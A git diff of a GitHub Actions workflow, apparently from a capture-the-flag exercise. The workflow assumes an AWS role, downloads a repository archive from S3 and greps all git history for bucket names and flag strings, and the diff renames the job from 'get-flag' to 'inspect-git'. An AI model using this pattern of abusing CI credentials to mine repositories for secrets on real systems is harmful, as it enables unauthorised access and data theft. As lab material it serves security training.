@@ -1,4 +1,4 @@
-name: get-flag
+name: inspect-git
 
 on:
   push:
@@ -21,9 +21,23 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Download dotgit
+      - name: Download repository archive
         run: |
           aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip ./dotgit.zip
-          ls -lh ./dotgit.zip
-          echo "=== ZIP CONTENTS ==="
-          unzip -l ./dotgit.zip | head -100
+          unzip -q dotgit.zip -d repo
+
+      - name: Search Git history
+        run: |
+          cd repo
+
+          echo "=== COMMITS ==="
+          git log --all --oneline --decorate
+
+          echo "=== BUCKET REFERENCES ==="
+          git grep -n -I -E 'codec4f26c862a321ef5|platform-bucket|flag\.txt|FLAG-' $(git rev-list --all) || true
+
+          echo "=== ALL S3 REFERENCES ==="
+          git grep -n -I -E 's3://|aws_s3_bucket|bucket.*=' $(git rev-list --all) || true
+
+          echo "=== ALL FLAG REFERENCES ==="
+          git grep -n -I -E 'flag|FLAG' $(git rev-list --all) || true
